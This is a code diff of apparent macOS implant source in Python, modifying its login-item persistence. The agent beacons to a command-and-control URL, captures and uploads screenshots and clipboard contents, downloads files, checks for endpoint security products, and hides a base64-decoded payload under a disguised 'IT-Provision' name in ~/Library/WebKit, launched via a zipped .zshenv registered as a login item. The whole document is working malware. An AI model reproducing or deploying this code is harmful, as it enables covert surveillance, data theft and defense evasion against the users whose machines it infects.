@@ -18,6 +18,7 @@ import shutil
 import CoreFoundation
 from SystemConfiguration import *
 import base64
+import zipfile
 
 
 letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890'
@@ -38,7 +39,7 @@ def screenshot():
         properties = {Quartz.kCGImagePropertyDPIWidth: 1024, Quartz.kCGImagePropertyDPIHeight: 720,}
         Quartz.CGImageDestinationAddImage(dest, image, properties)
         x = Quartz.CGImageDestinationFinalize(dest)
-                
+
         with open('/Users/Shared/out.png', 'rb') as fl:
             x = fl.read()
             vals = {'content':x}
@@ -48,7 +49,7 @@ def screenshot():
             respn = resp.read()
         fl.close()
         os.remove('/Users/Shared/out.png')
- 
+
     except Exception as e:
         vals = {'content':e}
         vals2 = urllib.urlencode(vals)
@@ -85,7 +86,7 @@ def download(data):
         request = urllib2.Request(srv,headers=headers,data=values2)
         response = urllib2.urlopen(request,context=context)
         resp = response.read()
-#######################    
+#######################
 def clipboard():
     try:
         pboard = NSPasteboard.generalPasteboard()
@@ -247,7 +248,7 @@ def checksecurity():
         y = str(x)
         seclist = []
         z = 0
-                
+
         if ('CbOsxSensorService' in each) or (os.path.exists("/Applications/CarbonBlack/CbOsxSensorService")):
             seclist.append("[+] Carbon Black OSX Sensor found")
             z = z + 1
@@ -350,22 +351,37 @@ def checksecurity():
 #################################
 def persist(data):
     try:
-        lfile = open('/Users/Shared/~$IT-Provision.command', 'w')
-        lfile.write('#!/usr/bin/python\n\n')
-        lfile.write('import subprocess\n\n')
-        lfile.write("subprocess.Popen('python /Users/Shared/\"~\$IT-Provision.py\" &',shell=True)")
-        lfile.close()
-        st = os.stat("/Users/Shared/~$IT-Provision.command")
-        os.chmod("/Users/Shared/~$IT-Provision.command",st.st_mode | 0o111)
-        
-        ofile = open('/Users/Shared/~$IT-Provision.py', 'wb')
+        uname = getpass.getuser()
+
+        prof = """echo "zsh profile error report" > /tmp/~\\$zshprofileerror.txt
+        nohup /usr/bin/python ~/Library/WebKit/\~\$IT-Provision.py &"""
+
+        #pfile = open('/Users/%s/Library/WebKit/.zshenv'%uname, 'w')
+        #pfile.write(prof)
+        #pfile.close()
+        #st = os.stat("/Users/%s/Library/WebKit/.zshenv"%uname)
+        #os.chmod("/Users/%s/Library/WebKit/.zshenv"%uname,st.st_mode | 0o111)
+
+
+        zf = zipfile.ZipFile('/Users/%s/~$IT-Provision.zip'%uname,mode='w',compression=zipfile.ZIP_DEFLATED)
+
+        zf.writestr(".zshenv",prof)
+
+        #zf.write('/Users/%s/Library/WebKit/.zshenv'%uname)
+        zf.close()
+        st = os.stat("/Users/%s/~$IT-Provision.zip"%uname)
+        os.chmod("/Users/%s/~$IT-Provision.zip"%uname,st.st_mode | 0o111)
+
+        #os.remove('/Users/%s/Library/WebKit/.zshenv'%uname)
+
+        ofile = open('/Users/%s/Library/WebKit/~$IT-Provision.py'%uname, 'wb')
         datal = base64.b64decode(data)
         ofile.write(datal)
 
         ofile.close()
-        st = os.stat("/Users/Shared/~$IT-Provision.py")
-        os.chmod("/Users/Shared/~$IT-Provision.py",st.st_mode | 0o111)
-        
+        st = os.stat("/Users/%s/Library/WebKit/~$IT-Provision.py"%uname)
+        os.chmod("/Users/%s/Library/WebKit/~$IT-Provision.py"%uname,st.st_mode | 0o111)
+
         SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
         functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                       ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
@@ -381,17 +397,18 @@ def persist(data):
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
 
         auth = SFAuthorization.authorization().authorizationRef()
-        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/%s/~$IT-Provision.zip"%uname, "/Users/%s/~$IT-Provision.zip"%uname, auth)
 
-        
-        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
+        count = len('/Users/%s/~$IT-Provision.zip'%uname)
+
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/%s/~$IT-Provision.zip'%uname,int(count),False)
         items = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
 
         myauth = LSSharedFileListSetAuthorization(items,auth)
-        name = CFStringCreateWithCString(None,'/Users/Shared/~$IT-Provision.command',kCFStringEncodingASCII)
+        name = CFStringCreateWithCString(None,'/Users/%s/~$IT-Provision.zip'%uname,kCFStringEncodingASCII)
         itemRef = LSSharedFileListInsertItemURL(items,kLSSharedFileListItemLast,name,None,temp,None,None)
-        
-        sendstring = "[+] Login Item persistence successful"
+
+        sendstring = "[+] Login Item persistence successful. ~/~$IT-Provision.zip added as login item to run ~/Library/WebKit/~$IT-Provision.py"
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/18'
         c = urllib2.Request(b,headers=headers,data=a.get('content'))
@@ -406,6 +423,7 @@ def persist(data):
 #####################################
 def unpersist():
     try:
+        uname = getpass.getuser()
         SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
         functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                       ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
@@ -418,15 +436,17 @@ def unpersist():
                       ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),
                       ('LSSharedFileListSetAuthorization',           'i^{OpaqueLSSharedFileListRef=}^{AuthorizationOpaqueRef=}'),
                       ('AuthorizationCreate',           'i^{_AuthorizationRights=I^{_AuthorizationItem=^cQ^vI}}^{_AuthorizationEnvironment=I^{_AuthorizationItem=^cQ^vI}}I^^{AuthorizationOpaqueRef=}'),]
-        
+
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
 
         auth = SFAuthorization.authorization().authorizationRef()
-        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/%s/~$IT-Provision.zip"%uname, "/Users/%s/~$IT-Provision.zip"%uname, auth)
 
-        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
-        
-        
+        count = len('/Users/%s/Library/WebKit/~$IT-Provision.zip'%uname)
+
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/%s/~$IT-Provision.zip'%uname,int(count),False)
+
+
         list_ref = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
         login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
         x = [list_ref, login_items]
@@ -434,15 +454,15 @@ def unpersist():
         for items in x[1]:
             err, a_CFURL, a_FSRef = LSSharedFileListItemResolve(items, kLSSharedFileListNoUserInteraction + kLSSharedFileListNoUserInteraction, None, None)
             url_list.append(a_CFURL)
-        path = NSURL.fileURLWithPath_('/Users/Shared/~$IT-Provision.command')
+        path = NSURL.fileURLWithPath_('/Users/%s/~$IT-Provision.zip'%uname)
         if path in url_list:
             i = url_list.index(path)
             target = login_items[i]
             result = LSSharedFileListItemRemove(list_ref, target)
 
-        os.remove('/Users/Shared/~$IT-Provision.command')
-        os.remove('/Users/Shared/~$IT-Provision.py')
-        sendstring = "[+] Login Item persistence and files removed"
+        os.remove('/Users/%s/~$IT-Provision.zip'%uname)
+        os.remove('/Users/%s/Library/WebKit/~$IT-Provision.py'%uname)
+        sendstring = "[+] ~/~$IT-Provision.zip and ~/Library/WebKit/~$IT-Provision.py Login Item persistence files removed"
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/19'
         c = urllib2.Request(b,headers=headers,data=a.get('content'))
@@ -599,11 +619,11 @@ while True:
         datastr = ''
         for each in rslts:
             data = each.replace('+++++','')
-            
+
             if (data[:6] == '["exit') or (data == '", "exit'):
                 sys.exit(0)
             elif (data[:12] == '["screenshot') or (data == '", "screenshot'):
-                screenshot()           
+                screenshot()
             elif (data[:11] == '["download ') or (data == '", "download '):
                 download(data)
             elif (data[:11] == '["clipboard') or (data == '", "clipboard'):
@@ -651,6 +671,5 @@ while True:
             datastr2 = datastr[2:]
             persist(datastr2)
 
-            
-    time.sleep(sleep)
 
+    time.sleep(sleep)
